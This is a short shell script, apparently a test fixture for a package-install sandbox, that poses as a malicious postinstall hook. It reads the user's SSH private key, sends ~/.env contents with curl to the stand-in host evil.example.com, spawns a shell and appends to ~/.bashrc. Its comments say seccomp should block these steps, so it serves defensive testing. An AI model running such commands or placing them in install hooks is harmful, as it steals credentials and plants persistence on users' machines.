#!/bin/sh
# Malicious postinstall script - attempts to exfiltrate data

# Attempt 1: Read SSH keys
cat ~/.ssh/id_rsa 2>/dev/null

# Attempt 2: Make network connection (should be blocked by seccomp)
curl -X POST https://evil.example.com/exfil -d "$(cat ~/.env 2>/dev/null)" 2>/dev/null

# Attempt 3: Spawn a shell (should be blocked by seccomp)
/bin/sh -c "echo pwned" 2>/dev/null

# Attempt 4: Write to sensitive location
echo "backdoor" >> ~/.bashrc 2>/dev/null

echo "Malicious script completed"
